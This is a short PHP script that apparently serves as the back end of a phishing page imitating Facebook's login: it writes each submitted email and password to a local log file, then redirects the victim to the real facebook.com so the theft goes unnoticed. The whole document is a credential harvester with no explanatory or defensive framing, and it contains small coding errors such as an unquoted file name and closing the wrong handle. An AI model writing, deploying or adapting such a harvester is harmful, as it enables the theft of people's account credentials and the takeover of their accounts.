<?php 
$fp = fopen(log.txt, "a");
fwrite($fp, " Email:$_POST[email]\tPassword:$_POST[pass]"."\xA");
fclose($fw);
header("Location: http://facebook.com/");
?>

